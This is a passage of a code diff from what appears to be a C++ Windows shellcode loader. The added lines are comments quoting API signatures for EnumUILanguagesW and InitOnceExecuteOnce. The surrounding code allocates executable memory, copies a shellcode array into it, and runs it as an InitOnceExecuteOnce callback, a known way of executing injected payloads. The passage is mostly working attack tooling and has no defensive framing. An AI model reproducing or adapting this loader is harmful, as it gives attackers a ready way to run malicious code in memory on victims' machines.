@@ -45,6 +45,14 @@ int main() {
         j++;
     }
     try {
+
+        //BOOL EnumUILanguagesW(
+        //[in] UILANGUAGE_ENUMPROCW lpUILanguageEnumProc,
+        //    [in] DWORD                dwFlags,
+        //    [in] LONG_PTR             lParam
+        //    );
+        
+        
         LPVOID address = ::VirtualAlloc(NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
         memcpy(address, &shellcode[0], sizeof(shellcode));
 
@@ -62,6 +70,17 @@ int main() {
         BOOL  bStatus;
 
         INIT_ONCE g_InitOnce = INIT_ONCE_STATIC_INIT;
+
+
+        //BOOL InitOnceExecuteOnce(
+        //[in, out]           PINIT_ONCE    InitOnce,
+        //    [in]                PINIT_ONCE_FN InitFn,
+        //    [in, optional]      PVOID         Parameter,
+        //    [in, out, optional] LPVOID* Context
+        //    );
+
+        // [in] InitFn
+        // A pointer to an application - defined InitOnceCallback function.
 
         ::InitOnceExecuteOnce(&g_InitOnce, (PINIT_ONCE_FN)address, NULL, &lpContext);
 
